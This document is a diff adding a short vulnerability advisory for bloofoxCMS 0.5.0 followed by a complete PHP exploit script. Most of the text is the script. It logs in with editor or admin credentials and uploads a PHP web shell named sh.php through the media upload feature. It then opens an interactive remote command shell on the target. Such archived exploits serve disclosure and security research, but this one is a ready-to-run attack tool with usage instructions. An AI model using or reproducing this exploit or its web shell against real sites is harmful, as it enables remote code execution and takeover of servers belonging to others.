@@ -1,0 +1,137 @@
+source: http://www.securityfocus.com/bid/60585/info
+
+bloofoxCMS is prone to a vulnerability that lets attackers upload arbitrary files. The issue occurs because the application fails to adequately sanitize user-supplied input.
+
+An attacker may leverage this issue to upload arbitrary files to the affected computer; this can result in arbitrary code execution within the context of the vulnerable application.
+
+bloofoxCMS 0.5.0 is vulnerable;other versions may also be affected. 
+
+<?php
+ 
+/*
+ 
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O .. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /        
+  / XXXXXX /
+ (________(          
+  `------'
+  
+ Exploit Title   : Bloofox CMS Unrestricted File Upload Exploit
+ Date            : 17 June 2013
+ Exploit Author  : CWH Underground
+ Site            : www.2600.in.th
+ Vendor Homepage : http://www.bloofox.com/
+ Software Link   : http://jaist.dl.sourceforge.net/project/bloofox/bloofoxCMS/bloofoxCMS_0.5.0.7z
+ Version         : 0.5.0
+ Tested on       : Window and Linux
+  
+  
+#####################################################
+VULNERABILITY: Unrestricted File Upload 
+#####################################################
+  
+ This application has an upload feature that allows an authenticated user
+with Administrator roles or Editor roles to upload arbitrary files to media
+directory cause remote code execution by simply request it.
+
+ 
+#####################################################
+EXPLOIT
+#####################################################
+  
+*/
+ 
+error_reporting(0);
+set_time_limit(0);
+ini_set("default_socket_timeout", 5);
+ 
+function http_send($host, $packet)
+{
+    if (!($sock = fsockopen($host, 80)))
+        die("\n[-] No response from {$host}:80\n");
+  
+    fputs($sock, $packet);
+    return stream_get_contents($sock);
+}
+
+
+  
+if ($argc < 3)
+{
+print "\n==============================================\n";
+print "  Bloofox CMS Unrestricted File Upload Exploit  \n";
+print "                                              \n";
+print "        Discovered By CWH Underground         \n";
+print "==============================================\n\n";
+print "  ,--^----------,--------,-----,-------^--,   \n";
+print "  | |||||||||   `--------'     |          O   \n";
+print "  `+---------------------------^----------|   \n";
+print "    `\_,-------, _________________________|   \n";
+print "      / XXXXXX /`|     /                      \n";
+print "     / XXXXXX /  `\   /                       \n";
+print "    / XXXXXX /\______(                        \n";
+print "   / XXXXXX /                                 \n";
+print "  / XXXXXX /   .. CWH Underground Hacking Team ..  \n";
+print " (________(                                   \n";
+print "  `------'                                    \n\n";
+print "\nUsage......: php $argv[0] <host> <path> <user> <password>\n";
+print "\nExample....: php $argv[0] target /bloofoxcms/ editor editor\n";
+    die();
+}
+ 
+$host = $argv[1];
+$path = $argv[2];
+
+$payload = "username={$argv[3]}&password={$argv[4]}&action=login";
+
+$packet  = "POST {$path}admin/index.php HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Referer: {$host}{$path}admin/index.php\r\n";
+$packet .= "Content-Length: ".strlen($payload)."\r\n";
+$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$packet .= "Connection: close\r\n\r\n{$payload}";
+
+$response = http_send($host, $packet);
+
+if (!preg_match("/Location: index.php/i", $response)) die("\n[-] Login failed!\n");
+if (!preg_match("/Set-Cookie: ([^;]*);/i", $response, $sid)) die("\n[-] Session ID not found!\n");
+
+print "\n..:: Login Successful ::..\n";
+print "\n..::   Waiting hell   ::..\n\n";
+
+$payload  = "--o0oOo0o\r\n";
+$payload .= "Content-Disposition: form-data; name=\"filename\"; filename=\"sh.php\"\r\n";
+$payload .= "Content-Type: application/octet-stream\r\n\r\n";
+$payload .= "<?php error_reporting(0); print(___); passthru(base64_decode(\$_SERVER[HTTP_CMD]));\r\n";
+$payload .= "--o0oOo0o--\r\n";
+
+$packet  = "POST {$path}admin/index.php?mode=content&page=media&action=new HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Referer: {$host}{$path}admin/index.php?mode=content&page=media&action=new\r\n";
+$packet .= "Cookie: {$sid[1]}\r\n";
+$packet .= "Content-Length: ".strlen($payload)."\r\n";
+$packet .= "Content-Type: multipart/form-data; boundary=o0oOo0o\r\n";
+$packet .= "Connection: close\r\n\r\n{$payload}";
+     
+http_send($host, $packet);
+ 
+$packet  = "GET {$path}media/files/sh.php HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Cmd: %s\r\n";
+$packet .= "Connection: close\r\n\r\n";
+     
+while(1)
+{
+    print "\nBloofox-shell# ";
+    if (($cmd = trim(fgets(STDIN))) == "exit") break;
+    $response = http_send($host, sprintf($packet, base64_encode($cmd)));
+    preg_match('/___(.*)/s', $response, $m) ? print $m[1] : die("\n[-] Exploit failed!\n");
+}
+ 
+?>
